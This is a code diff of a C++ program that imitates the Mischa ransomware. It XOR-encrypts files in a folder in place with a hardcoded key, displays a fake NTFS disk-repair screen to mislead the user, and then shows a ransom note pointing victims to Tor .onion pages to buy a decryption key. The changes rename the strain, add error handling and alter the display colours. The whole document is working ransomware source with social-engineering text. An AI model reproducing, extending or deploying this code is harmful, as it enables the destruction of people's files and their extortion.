@@ -1,4 +1,4 @@
-﻿#include <iostream>
+#include <iostream>
 #include <fstream>
 #include <string>
 #include <filesystem>
@@ -11,7 +11,7 @@ using namespace std;
 using namespace std::filesystem;
 
 const int DISK_SIZE = 350931;
-const string ultimateKey = "Misha23";
+const string ultimateKey = "Mischa23";
 
 string XOREncryptDecrypt(const string& input, const string& originalKey) {
     string output = input;
@@ -30,6 +30,7 @@ void processFilesInDirectory(const string& directory, const string& password) {
             const string filePath = entry.path().string();
             ifstream inputFile(filePath, ios::binary);
             if (!inputFile) {
+                system("pause");
                 cerr << "Failed to open input file: " << filePath << "\n";
                 continue;
             }
@@ -41,6 +42,7 @@ void processFilesInDirectory(const string& directory, const string& password) {
 
             ofstream outputFile(filePath, ios::binary | ios::trunc);
             if (!outputFile) {
+                system("pause");
                 cerr << "Failed to open output file: " << filePath << "\n";
                 continue;
             }
@@ -54,7 +56,24 @@ void processFilesInDirectory(const string& directory, const string& password) {
 void StartMessage()
 {
     int sectorPercent = 0;
-    processFilesInDirectory("hey", ultimateKey);
+    try {
+        processFilesInDirectory("hey", ultimateKey);
+    }
+    catch (const filesystem_error& ex) {
+        bool keyPressed = false;
+        while (!keyPressed) {
+            cerr << "FATAL: There is nothing to encrypt." << endl;
+            cout << "\n\n(PRESS ANY KEY)";
+            Sleep(150);
+            system("cls");
+            Sleep(150);
+
+            if (_kbhit()) {
+                break;
+            }
+        }
+        exit(1); 
+    }
     cout << "Repairing file system on C: \n" << endl;
     cout << "The type of the file system is NTFS.\n" << endl;
     cout << "One of your disks contains errors and needs to be repaired. This process" << endl;
@@ -62,7 +81,7 @@ void StartMessage()
 
     cout << "\nWARNING: DO NOT TURN OFF YOUR PC! IF YOU ABORT THIS PROCESS. YOU COULD" << endl;
     cout << "DESTROY ALL OF YOUR DATA! PLEASE ENSURE THAT YOUR POWER CABLE IS PLUGGED\nIN!\n" << endl;
-
+    
 
     for (int sector = 0; sector <= DISK_SIZE; sector++)
     {
@@ -130,13 +149,13 @@ void EncryptedMessage()
     system("cls");
     system("color 02");
 
-    cout << "You became victim of the MISHA RANSOMWARE!\n\n" << endl;
-    cout << "The harddisks of your computer have been encrypted with an military grade" << endl;;
-    cout << "encryption algorithm.There is no way to restore your data without a special " << endl;
-    cout << "key.You can purchase this key on the darknet page shown in step 2.\n" << endl;
+    cout << "You became victim of the MISCHA RANSOMWARE!\n\n" << endl;
+    cout << "The files on your computer have been encrypted with an military grade" << endl;;
+    cout << "encryption algorithm. There is no way to restore your data without a special " << endl;
+    cout << "key. You can purchase this key on the darknet page shown in step 2.\n" << endl;
     cout << "To purchase your key and restore your data, please follow these three easy steps: \n" << endl;
     cout << "1. Download the Tor Browser at <<https://www.torproject.org/>>. If you need" << endl;
-    cout << "help, please google for <<access onion page>>\n" << endl;
+    cout << "help, please google for 'access onion page'>>\n" << endl;
     cout << "2. Visit one of the following pages with the Tor Browser : \n" << endl;
     cout << "http://misha37h5tbhyvki.onion/QPRmMR" << endl;
     cout << "http://misha5koahtsf7sv.onion/QPRmMR\n" << endl;
@@ -181,7 +200,7 @@ void EndScreen() {
     bool keyPressed = false;
 
     system("cls");
-    system("color 84");
+    system("color 02");
 
     while (!keyPressed) {
         system("cls");
@@ -192,10 +211,9 @@ void EndScreen() {
         Sleep(100);
 
         if (_kbhit()) {
-            return;
+            break;
         }
     }
-    return;
 }
 
 int main()
